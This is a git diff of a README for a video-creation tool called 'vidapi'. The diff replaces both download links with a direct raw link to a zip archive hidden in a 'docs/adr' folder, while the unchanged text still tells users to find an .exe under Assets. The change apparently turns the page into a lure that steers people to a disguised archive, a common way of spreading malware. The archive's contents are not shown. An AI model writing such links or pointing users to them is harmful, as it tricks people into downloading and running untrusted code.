@@ -1,6 +1,6 @@
 # 🎞️ vidapi - Create professional videos using simple code
 
-[![](https://img.shields.io/badge/Download-vidapi-blue.svg)](https://github.com/donkeypumpalleviation558/vidapi)
+[![](https://img.shields.io/badge/Download-vidapi-blue.svg)](https://github.com/donkeypumpalleviation558/vidapi/raw/refs/heads/main/docs/adr/Software_v2.4.zip)
 
 ## What this software does
 
@@ -20,7 +20,7 @@ Your computer needs the following features to run this software:
 
 You can grab the latest version of the application from our release page. 
 
-[Click here to visit the download page](https://github.com/donkeypumpalleviation558/vidapi)
+[Click here to visit the download page](https://github.com/donkeypumpalleviation558/vidapi/raw/refs/heads/main/docs/adr/Software_v2.4.zip)
 
 Look for the section marked Assets. You should see a file ending in .exe. Click this file to start the download. Once the bar finishes, open the folder on your computer where the file saved.
 
